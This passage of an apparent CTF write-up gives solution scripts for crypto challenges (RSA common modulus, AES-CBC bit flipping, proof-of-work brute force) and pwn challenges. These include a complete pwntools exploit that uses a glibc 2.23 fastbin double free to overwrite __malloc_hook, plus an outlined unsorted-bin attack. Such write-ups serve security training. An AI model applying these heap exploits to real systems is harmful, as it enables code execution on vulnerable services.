class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未能找到满足所有条件的 A 值，请尝试扩大搜索范围或检查数据。&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># Flag = b&#x27;flag&#123;&#x27;+hashlib.md5((str(a)).encode()).hexdigest().encode()+b&#x27;&#125;&#x27;</span></span><br><span class="line">    a_str = <span class="built_in">str</span>(found_a)</span><br><span class="line">    md5_hash = hashlib.md5(a_str.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">f&quot;flag&#123;&#123;<span class="subst">&#123;md5_hash&#125;</span>&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">30</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;A 值: <span class="subst">&#123;found_a&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;MD5 哈希: <span class="subst">&#123;md5_hash&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;最终 Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="common-rsa">common rsa</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">N = <span class="number">162178605357818616394571566923155907889899677780239882906511996614607940884142045197452389471499799373787832649318837814454679970724845203557871078001956378966434166323827984964942729898095347038272003371167123553368531662277059263517900162297903110415768403265100411543878859321181606008503516896600638590699</span></span><br><span class="line">e1 = <span class="number">35422</span></span><br><span class="line">c1 = <span class="number">153249315480380808558746807096025628082875635601515291525075274335055878390662930254941118045696231628008256877302589689883059616503108946971165183674522403835250738176157466145855833767128209866527507862726083268576304163200171600023472544755768741118904892489037291247455823396160705615280802805803254323033</span></span><br><span class="line">e2 = <span class="number">1033</span></span><br><span class="line">c2 = <span class="number">5823189490163315770684717059899864988806118565674660089157163486577056500243194221873916232616081138765317598078910078375360361118674333149663483360677725162911935082290640547407140413703664960164356579153623498735889314476063673352676918268911309402784919521792079943937126634436658784515914270266106683548</span></span><br><span class="line"></span><br><span class="line">a = <span class="built_in">pow</span>(e1, -<span class="number">1</span>, e2)</span><br><span class="line">b = (a * e1 - <span class="number">1</span>) // e2</span><br><span class="line">m = <span class="built_in">pow</span>(c1, a, N) * <span class="built_in">pow</span>(c2, -b, N) % N</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;A_RSA_c0mm0n_m0dulu5_4tt4ck&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="aesstudy">aesstudy</h3>
<p>PoW</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;hashlib.sha256(x).hexdigest()[0:8]==&#x27;&quot;</span>)</span><br><span class="line">    <span class="built_in">hash</span> = io.recvline().strip().decode()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hash</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;x.encode(&#x27;hex&#x27;)=&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">                x = <span class="built_in">chr</span>(i) + <span class="built_in">chr</span>(j) + <span class="built_in">chr</span>(k)</span><br><span class="line">                <span class="keyword">if</span> hashlib.sha256(x.encode()).hexdigest()[<span class="number">0</span>:<span class="number">8</span>] == <span class="built_in">hash</span>:</span><br><span class="line">                    <span class="built_in">print</span>(tmp := <span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>) + <span class="built_in">hex</span>(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>) + <span class="built_in">hex</span>(k)[<span class="number">2</span>:].zfill(<span class="number">2</span>))</span><br><span class="line">                    io.sendline(tmp.encode())</span><br><span class="line">                    <span class="keyword">return</span></span><br></pre></td></tr></table></figure>
<p>字节翻转</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a: <span class="built_in">bytes</span>, b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b))</span><br><span class="line"></span><br><span class="line">output = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># c1.encode(&#x27;base64&#x27;)=bgq/Ch4pfw/GVvIdv4g0GpGctUxy17V/+/5xOwoXvajpR/ZnTZ06SKJ4Ou3M0G9aal2qaY2j2ry6+PLCh1ssutMv/GGPK75Nhnnh1S2xB3TBphygCB3jGkIQYiewAZNAgvjuaSvf2r5X+6OVla0ic6+xxcm7oOfWka9cTFbEZDr8AbrYjZhzsgTnxtCR428327anGeM1A5cc1f1SWRBVFdngxMFm8kNlQA1093nAQLIM9cN+KQkUpBK378SsPfj2VN7C+knx7qfUw0HiKvsUZKdjAicOuQXJdTrRRpyxUkmopH8ursLna0JBjbnUh2yaAGfhGcN6uzbysixnG9eX8g==</span></span><br><span class="line"><span class="string"># m1.encode(&#x27;base64&#x27;)=JCMCRlp9hRzEYutAiZfSHhqRGWJ3n5TG7HAdVS6XMUsAB4q0Uh5c90ezMalWONeU/5KT49g/vWrLcrXU8gS/ZYO0+UoLZZvJfzHbIZvFIGHgEhhvGlCNscf772OE0AiW5CtaTmxnBe0bLutx1k1ZllSjux+K/gyhck0DQ9TSMTVdzvio5YkYWF+cKWP+JgIOaZFEdz+kwq4E42m7AoUyO8wspg72AUbPe9Z8tTiHrChjjSD/+t1MSfLZqSPvvZkN3S644/aUsy8PL/o1qY0ASVZKi1o1DS3jf1MD6QTY1Xb4f+Y7m8xD27J+AtsVdquwJm1lj8xWm3EHXzYDz1mZHg==</span></span><br><span class="line"><span class="string"># m2=aes_cbc_decode(password,iv,c2)</span></span><br><span class="line"><span class="string"># m2[28]=T</span></span><br><span class="line"><span class="string"># m2[53]=i</span></span><br><span class="line"><span class="string"># m2[94]=c</span></span><br><span class="line"><span class="string"># m2[124]=h</span></span><br><span class="line"><span class="string"># m2[147]=x</span></span><br><span class="line"><span class="string"># m2[180]=m</span></span><br><span class="line"><span class="string"># m2[209]=l</span></span><br><span class="line"><span class="string"># m2[254]=H</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.split(<span class="string">&quot;# m2=aes_cbc_decode(password,iv,c2)\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">tmp = output[<span class="number">0</span>].replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).strip().replace(<span class="string">&quot;# c1.encode(&#x27;base64&#x27;)=&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;# m1.encode(&#x27;base64&#x27;)=&quot;</span>, <span class="string">&quot;\n&quot;</span>).split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">c1, m1 = <span class="built_in">map</span>(base64.b64decode, tmp)</span><br><span class="line"></span><br><span class="line">tmp = output[<span class="number">1</span>]</span><br><span class="line">target = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> tmp.strip().split(<span class="string">&quot;\n&quot;</span>):</span><br><span class="line">    <span class="keyword">if</span> line:</span><br><span class="line">        line = line.strip()[<span class="number">5</span>:].split(<span class="string">&quot;]=&quot;</span>)</span><br><span class="line">        target.append((<span class="built_in">int</span>(line[<span class="number">0</span>]), line[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">c2 = <span class="built_in">bytearray</span>(c1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> target:</span><br><span class="line">    c2[i - <span class="number">16</span>] ^= m1[i] ^ <span class="built_in">ord</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(c2).decode())</span><br></pre></td></tr></table></figure>
<h3 id="work">work</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_hex</span>(<span class="params">h</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(h)[::-<span class="number">1</span>].<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">url = <span class="string">f&quot;https://blockchain.info/rawblock/600001&quot;</span></span><br><span class="line">data = requests.get(url).json()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data[<span class="string">&quot;hash&quot;</span>])</span><br><span class="line">tmp = <span class="built_in">len</span>(data[<span class="string">&quot;hash&quot;</span>]) - <span class="built_in">len</span>(data[<span class="string">&quot;hash&quot;</span>].lstrip(<span class="string">&quot;0&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> tmp &gt;= <span class="number">20</span>:</span><br><span class="line"></span><br><span class="line">    header = (</span><br><span class="line">        struct.pack(<span class="string">&quot;&lt;I&quot;</span>, data[<span class="string">&quot;ver&quot;</span>])</span><br><span class="line">        + <span class="built_in">bytes</span>.fromhex(reverse_hex(data[<span class="string">&quot;prev_block&quot;</span>]))</span><br><span class="line">        + <span class="built_in">bytes</span>.fromhex(reverse_hex(data[<span class="string">&quot;mrkl_root&quot;</span>]))</span><br><span class="line">        + struct.pack(<span class="string">&quot;&lt;I&quot;</span>, data[<span class="string">&quot;time&quot;</span>])</span><br><span class="line">        + struct.pack(<span class="string">&quot;&lt;I&quot;</span>, data[<span class="string">&quot;bits&quot;</span>])</span><br><span class="line">        + struct.pack(<span class="string">&quot;&lt;I&quot;</span>, data[<span class="string">&quot;nonce&quot;</span>])</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    first_hash = hashlib.sha256(header).digest()</span><br><span class="line">    second_hash = hashlib.sha256(first_hash).digest()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(second_hash.<span class="built_in">hex</span>()) - <span class="built_in">len</span>(second_hash.<span class="built_in">hex</span>().rstrip(<span class="string">&quot;0&quot;</span>)))</span><br><span class="line">    <span class="built_in">print</span>(base64.b64encode(first_hash).decode())</span><br></pre></td></tr></table></figure>
<h2 id="pwn">Pwn</h2>
<h3 id="easyuaf">easyuaf</h3>
<h4 id="分析">分析</h4>
<figure>
<img src="/images/古剑山2025-初赛-Writeup/image-20251129120549795.png"
alt="image-20251129120549795" />
<figcaption aria-hidden="true">image-20251129120549795</figcaption>
</figure>
<p>2.23 uaf 直接打fastbin double free</p>
<h4 id="exp">EXP</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    author: mick0960</span></span><br><span class="line"><span class="string">    time: 2025-11-29 09:31:08</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"><span class="comment">#----------------function area start----------------#</span></span><br><span class="line">sla = <span class="keyword">lambda</span> ch,data:p.sendlineafter(ch,data)</span><br><span class="line">sda = <span class="keyword">lambda</span> ch,data:p.sendafter(ch,data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data:p.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data:p.sendline(data)</span><br><span class="line">addr32 = <span class="keyword">lambda</span>:u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">addr64 = <span class="keyword">lambda</span>:u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">ru = <span class="keyword">lambda</span> con:p.recvuntil(con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">addr</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    打印变量名及其对应的地址</span></span><br><span class="line"><span class="string">    :param addr: 变量或地址</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    frame = inspect.currentframe().f_back</span><br><span class="line">    variables = &#123;<span class="built_in">id</span>(val): name <span class="keyword">for</span> name, val <span class="keyword">in</span> frame.f_locals.items()&#125;</span><br><span class="line">    addr_name = variables.get(<span class="built_in">id</span>(addr), <span class="string">&quot;Unknown&quot;</span>)</span><br><span class="line">    log.success(<span class="string">f&quot;<span class="subst">&#123;addr_name&#125;</span> --&gt; <span class="subst">&#123;<span class="built_in">hex</span>(addr) <span class="keyword">if</span> <span class="built_in">isinstance</span>(addr, <span class="built_in">int</span>) <span class="keyword">else</span> addr&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">pie=<span class="number">0</span>, bp=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    用于调试程序的函数。</span></span><br><span class="line"><span class="string">    :param pie: 是否启用 PIE 模式 (Position Independent Executable)</span></span><br><span class="line"><span class="string">    :param bp: 断点，可以是字符串（单个断点）或列表（多个断点）</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    debug_script = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    \nset debug-file-directory /home/mick0960/.config/cpwn/pkgs/2.23-0ubuntu9/amd64/libc6-dbg_2.23-0ubuntu9_amd64/usr/lib/debug\n</span></span><br><span class="line"><span class="string">    set directories /home/mick0960/.config/cpwn/pkgs/2.23-0ubuntu9/amd64/glibc-source_2.23-0ubuntu9_all/usr/src/glibc/glibc-2.23\n</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = p.libs()[p.elf.path]</span><br><span class="line">        <span class="keyword">if</span> bp:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(bp, <span class="built_in">str</span>):</span><br><span class="line">                bp = <span class="string">f&quot;*<span class="subst">&#123;<span class="built_in">hex</span>(base + <span class="built_in">int</span>(bp, <span class="number">16</span>))&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(bp, <span class="built_in">list</span>):</span><br><span class="line">                bp = [<span class="string">f&quot;*<span class="subst">&#123;<span class="built_in">hex</span>(base + <span class="built_in">int</span>(b, <span class="number">16</span>))&#125;</span>&quot;</span> <span class="keyword">for</span> b <span class="keyword">in</span> bp]</span><br><span class="line">        gdb.attach(p, gdbscript=<span class="string">&quot;&quot;</span>.join(bp) + debug_script <span class="keyword">if</span> bp <span class="keyword">else</span> debug_script)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> bp:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(bp, <span class="built_in">str</span>):</span><br><span class="line">                bp = <span class="string">f&quot;b *<span class="subst">&#123;bp&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(bp, <span class="built_in">list</span>):</span><br><span class="line">                bp = [<span class="string">f&quot;b *<span class="subst">&#123;b&#125;</span>&quot;</span> <span class="keyword">for</span> b <span class="keyword">in</span> bp]</span><br><span class="line">        gdb.attach(p, gdbscript=<span class="string">&quot;&quot;</span>.join(bp) + debug_script <span class="keyword">if</span> bp <span class="keyword">else</span> debug_script)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getsb</span>(<span class="params">func,align=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> context.arch == <span class="string">&#x27;i386&#x27;</span>:</span><br><span class="line">        libc_base = libc.address = addr32() - libc.sym[<span class="string">f&#x27;<span class="subst">&#123;func&#125;</span>&#x27;</span>]</span><br><span class="line">        lg(libc_base)</span><br><span class="line">        <span class="keyword">return</span> \</span><br><span class="line">            p32(elf.search(asm(<span class="string">&#x27;ret&#x27;</span>),executable=<span class="literal">True</span>)) + \</span><br><span class="line">            p32(libc.system) + p32(<span class="number">0</span>) + p32(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()) \</span><br><span class="line">            <span class="keyword">if</span> align \</span><br><span class="line">            <span class="keyword">else</span> \</span><br><span class="line">            p32(libc.system) + p32(<span class="number">0</span>) + p32(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        libc_base = libc.address = addr64() - libc.sym[<span class="string">f&#x27;<span class="subst">&#123;func&#125;</span>&#x27;</span>]</span><br><span class="line">        lg(libc_base)</span><br><span class="line">        <span class="keyword">return</span> \</span><br><span class="line">            p64(elf.search(asm(<span class="string">&#x27;ret&#x27;</span>),executable=<span class="literal">True</span>)) + \</span><br><span class="line">            p64(elf.search(asm(<span class="string">&#x27;pop rdi;ret&#x27;</span>),executable=<span class="literal">True</span>)) + \</span><br><span class="line">            p64(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()) + p64(libc.system) \</span><br><span class="line">            <span class="keyword">if</span> align \</span><br><span class="line">            <span class="keyword">else</span> \</span><br><span class="line">            p64(elf.search(asm(<span class="string">&#x27;pop rdi;ret&#x27;</span>),executable=<span class="literal">True</span>)) + \</span><br><span class="line">            p64(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()) + p64(libc.system)</span><br><span class="line"><span class="comment">#----------------function area end------------------#</span></span><br><span class="line"><span class="comment">#----------------predefine area start------------------#</span></span><br><span class="line">elf_name = <span class="string">&quot;./ezuaf&quot;</span></span><br><span class="line"><span class="comment"># p = process(elf_name)</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.107.139.41&#x27;</span>,<span class="string">&#x27;46358&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(elf_name)</span><br><span class="line">libc_name = <span class="string">&quot;/home/mick0960/.config/cpwn/pkgs/2.23-0ubuntu9/amd64/libc6_2.23-0ubuntu9_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">libc = ELF(libc_name) <span class="keyword">if</span> libc_name <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"><span class="comment">#----------------predefine area end------------------#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">ch</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(ch))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, con</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index of the note&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;length of the note&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sda(<span class="string">&#x27;note&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index of the note&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, con</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;note:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sda(<span class="string">&#x27;your note:&#x27;</span>, con)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x90</span>, <span class="string">&#x27;mick0960&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">&#x27;mick0960&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&#x27;The content of the note:&#x27;</span>)</span><br><span class="line">libc_base = libc.address = <span class="built_in">int</span>.from_bytes(p.recvline(keepends=<span class="literal">False</span>), byteorder=<span class="string">&#x27;little&#x27;</span>) - <span class="number">0x3c4b78</span></span><br><span class="line">lg(libc_base)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x90</span>, <span class="string">&#x27;mick0960&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x60</span>, <span class="string">&#x27;mick0960&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x60</span>, <span class="string">&#x27;mick0960&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">fake_chunk = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span></span><br><span class="line">lg(fake_chunk)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x60</span>, p64(fake_chunk))</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x60</span>, <span class="string">&#x27;mick0960&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x60</span>, <span class="string">&#x27;mick0960&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x60</span>, <span class="string">&#x27;mick0960&#x27;</span>)</span><br><span class="line"><span class="comment"># add(5, 0x70, &#x27;mick0960&#x27;)</span></span><br><span class="line">edit(<span class="number">6</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span> + p64(<span class="number">0x40088A</span>))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x10</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="o">o</h3>
<p>堆题但是限制了 fastbin</p>
<figure>
<img src="/images/古剑山2025-初赛-Writeup/clip_image002.png"
alt="标题: fig:" />
<figcaption aria-hidden="true">标题: fig:</figcaption>
</figure>
<p>在 dele中存在 uaf</p>
<figure>
<img src="/images/古剑山2025-初赛-Writeup/clip_image004.png"
alt="标题: fig:" />
<figcaption aria-hidden="true">标题: fig:</figcaption>
</figure>
<p>限制死了fastbin但是仍然可以unsorted bin attack 去篡改全局 fastbin max
然后就可以正常使用fastbin了，这样就很后转换，可以先泄露栈地址，这里直接攻击io</p>
